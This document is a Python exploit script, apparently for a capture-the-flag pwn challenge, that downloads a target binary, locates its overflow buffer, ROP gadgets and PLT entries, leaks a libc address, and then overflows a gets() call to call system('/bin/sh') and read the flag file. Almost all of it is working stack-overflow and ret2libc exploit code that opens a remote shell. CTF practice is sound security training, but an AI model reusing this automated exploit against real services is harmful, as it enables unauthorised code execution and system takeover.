#! env python3

# https://docs.python.org/3/library/socket.html
import time
import socket
import base64
import subprocess, os
import re
from fcntl import fcntl, F_GETFL, F_SETFL
from os import O_NONBLOCK

HOST = 'challs.xmas.htsp.ro'
PORT = 12002

def find_plt_relocation(b, f):
    o = subprocess.check_output(['/usr/bin/readelf', '-r',  b])
    o = o.decode('utf-8')
    o = o.split('\n')

    for l in o:
        if "R_X86_64_JUMP_SLO" in l and f in l:
            return int(l.split(' ')[0], 16).to_bytes(8, 'little')

    return None

def find_gadget(b, g):
    try:
        o = subprocess.check_output(['/usr/bin/ROPgadget', '--binary', b])
    except Exception as e:
        o = e.output
        o = o.decode('utf-8')
        o = o.split('\n')
        for l in o:
            if l.endswith(' : {:s} ; ret'.format(g)):
                return int(l.split(' ')[0], 16).to_bytes(8, 'little')

        return None

def find_plt_trampoline(b, f):
    o = subprocess.check_output(['/usr/bin/objdump', '-D', b]).decode('utf-8').split('\n')
    for l in o:
        if l.endswith(' <{:s}@plt>:'.format(f)):
            return int(l.split(' ')[0], 16).to_bytes(8, 'little')

    return None

def find_buffer_size(b):
    o = subprocess.check_output(['/usr/bin/objdump', '-D', b]).decode('utf-8').split('\n')
    for i, l in enumerate(o):
        res = re.match('.*callq.*gets@plt.*', l)
        if res is not None:
            l_lea = o[i - 3]
            idx1 = l_lea.find('-')
            idx2 = l_lea.find('(', idx1)
            return int(l_lea[idx1 + 1:idx2], 16)

def find_main(b):
    o = subprocess.check_output(['/usr/bin/objdump', '-D', b]).decode('utf-8').split('\n')
    for i, l in enumerate(o):
        res = re.match('.*callq.*setvbuf@plt.*', l)
        if res is not None:
            l_main = o[i - 8]
            l_main = l_main.strip()
            return int(l_main[:l_main.find(':')], 16).to_bytes(8, 'little')


class Connection:
    def __init__(self, host, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # set TCP_NODELAY to send data immediately
        self.s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        # set timeout None to always wait for data to be received
        # https://docs.python.org/3/library/socket.html#socket.socket.settimeout
        self.s.settimeout(None)

        self.s.connect((host, port))

    def wait(self, message=None):
        if not message:
            message = "press enter to continue"
        input(message)

    def recvuntil(self, data):
        if type(data) in [bytes, bytearray]:
            bdata = data
        else:
            bdata = data.encode('utf-8')

        brecv = b''
        while not brecv.endswith(bdata):
            brecv += self.s.recv(1)

        if type(data) in [bytes, bytearray]:
            return brecv
        else:
            return brecv.decode('utf-8')

    def send(self, data):
        if type(data) in [bytes, bytearray]:
            self.s.send(data)
        else:
            self.s.send(data.encode('utf-8'))

    def setblocking(self, mode):
        # https://docs.python.org/3/library/socket.html#socket.socket.setblocking
        self.s.setblocking(mode)

    def recv(self, size):
        return self.s.recv(size)

class Process:
    def __init__(self, command, gdb=False):
        env = os.environ.copy()

        # https://docs.python.org/3/library/subprocess.html#subprocess.Popen
        self.p = subprocess.Popen(command,
                                  stdout=subprocess.PIPE,
                                  stdin=subprocess.PIPE,
                                  bufsize=0,
                                  env=env,
                                  shell=False)

        self._original_flags = fcntl(self.p.stdout, F_GETFL)
        if gdb:
            print("new process pid: {:d}".format(self.p.pid))
            self.wait()

    def wait(self, message=None):
        if not message:
            message = "press enter to continue"
        input(message)

    def recvuntil(self, data):
        if type(data) in [bytes, bytearray]:
            bdata = data
        else:
            bdata = data.encode('utf-8')

        brecv = b''
        while not brecv.endswith(bdata):
            brecv += self.p.stdout.read(1)

        if type(data) in [bytes, bytearray]:
            return brecv
        else:
            return brecv.decode('utf-8')

    def setblocking(self, mode):
        # http://eyalarubas.com/python-subproc-nonblock.html
        if mode == False:
            fcntl(self.p.stdout, F_SETFL, self._original_flags | O_NONBLOCK)
        else:
            fcntl(self.p.stdout, F_SETFL, self._original_flags)

    def recv(self, size):
        return self.p.stdout.read(size)

    def send(self, data):
        if type(data) in [bytes, bytearray]:
            self.p.stdin.write(data)
        else:
            self.p.stdin.write(data.encode('utf-8'))


binary_file = 'binary'

c = Connection(HOST, PORT)
#c = Process(['./' + binary_file], gdb=True)
#c.setblocking(False)

c.recvuntil('Content: b\'')
binary = c.recvuntil('\'')

with open(binary_file, 'wb') as f:
    f.write(base64.b64decode(binary))

# buffer length given by ida
#blen = int(input('buffer length: '))
blen = find_buffer_size(binary_file)

# fill the buffer until the return address
payload = (b'a' * (blen + 8))
# puts the address of printf
payload += \
    find_gadget(binary_file, 'pop rdi') + \
    find_plt_relocation(binary_file, 'printf') + \
    find_plt_trampoline(binary_file, 'puts')
# go back to execute main
payload += find_main(binary_file)

# check if \n in the payload which triggers the exploit prematurely
if b'\n' in payload:
    print('cacat')
    exit(1)

c.wait()

# read the initial output
c.recv(200)

# send the payload
c.send(payload + b'\n')

# wait for the payload to be executed
c.wait('running first payload')

# read the initial message
c.recv( len("Welcome, ") )
# read the part of the payload used as name
c.recv(payload.find(b'\x00'))

# read some more bytes with the address of printf
out = c.recv(200)
# the address of printf ends with e80 so we search for that
while out[0] != 0x80:
#while out[0] != 0xe0:
    out = out[1:]
out = out[:6]
addr_mem_printf = int.from_bytes(out, 'little')
print("found printf at 0x{:08x}".format(addr_mem_printf))

# server values
addr_bin_printf = 0x64e80
addr_bin_system = 0x4f440
addr_bin_binsh = 0x1b3e9a
addr_bin_execl = 0xe5160
# local values
#addr_bin_printf = 0x532e0
#addr_bin_system = 0x450a0
#addr_bin_binsh = 0x186cee

addr_mem_system = addr_mem_printf - (addr_bin_printf - addr_bin_system)
addr_mem_binsh = addr_mem_printf + (addr_bin_binsh - addr_bin_printf)
addr_mem_execl = addr_mem_printf - (addr_bin_printf - addr_bin_execl)

# fill the buffer until the return address
payload = (b'a' * (blen + 8))
# system /bin/sh
payload += \
    find_gadget(binary_file, 'pop rdi') + \
    addr_mem_binsh.to_bytes(8, 'little') + \
    find_gadget(binary_file, 'pop rsi ; pop r15') + \
    b'\x00' * 16 + \
    addr_mem_system.to_bytes(8, 'little')
# go back to execute main
#payload += find_main(binary_file)

# send the payload
c.send(payload + b'\n')
c.wait('running second payload')
c.recv(500)

# we should have a shell here...
c.send('cat /home/ctf/flag.txt\n')

c.wait('waiting for shell command output')

print(c.recv(500))
